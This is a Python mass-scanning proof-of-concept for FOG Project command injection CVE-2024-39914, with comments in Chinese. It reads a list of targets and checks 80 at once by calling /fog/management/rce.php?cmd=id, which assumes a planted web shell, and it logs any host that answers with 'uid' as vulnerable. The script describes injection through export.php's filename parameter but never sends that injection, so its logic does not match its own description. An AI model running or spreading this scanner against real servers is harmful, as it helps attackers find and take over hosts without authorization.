# FOG Project 文件名命令注入漏洞(CVE-2024-39914)
# body="FOG Project"
# 产品简介:FOG是一个开源的计算机镜像解决方案，旨在帮助管理员轻松地部署、维护和克隆大量计算机。FOG Project 提供了一套功能强大的工具，使用户能够快速部署操作系统、软件和配置设置到多台计算机上，从而节省时间和精力。该项目支持基于网络的 PXE 启动、镜像创建和还原、硬件和软件清单管理、远程控制和监视等功能，为 IT 管理员和系统管理员提供了一个全面的工具集。
# 漏洞概述:该漏洞在FOGPROJECT中的packages/web/lib/fog/reportmaker.class.php文件受到命令注入漏洞的影响，该漏洞存在于/fog/management/export.php的filename参数，未经身份验证的远程攻击者可利用此漏洞执行任意命令，获取服务器权限。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗     ██████╗  █████╗  █████╗  ██╗██╗  ██╗
\x1b[36m██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║     ╚════██╗██╔══██╗██╔══██╗███║██║  ██║
\x1b[34m██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗█████╔╝╚██████║╚██████║╚██║███████║
\x1b[35m██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝╚═══██╗ ╚═══██║ ╚═══██║ ██║╚════██║
\x1b[31m╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║     ██████╔╝ █████╔╝ █████╔╝ ██║     ██║
\x1b[33m ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝     ╚═════╝  ╚════╝  ╚════╝  ╚═╝     ╚═╝                                                                                                                                                     
                                                            --author:Kucei
                                                            --Version:FOG_Project_文件名命令注入漏洞(CVE-2024-39914)                                                  
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('FOG_Project_文件名命令注入漏洞(CVE-2024-39914)')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/fog/management/rce.php?cmd=id"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = ''
    try :
        response = requests.post(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'uid' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('CVE-2024-39914.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()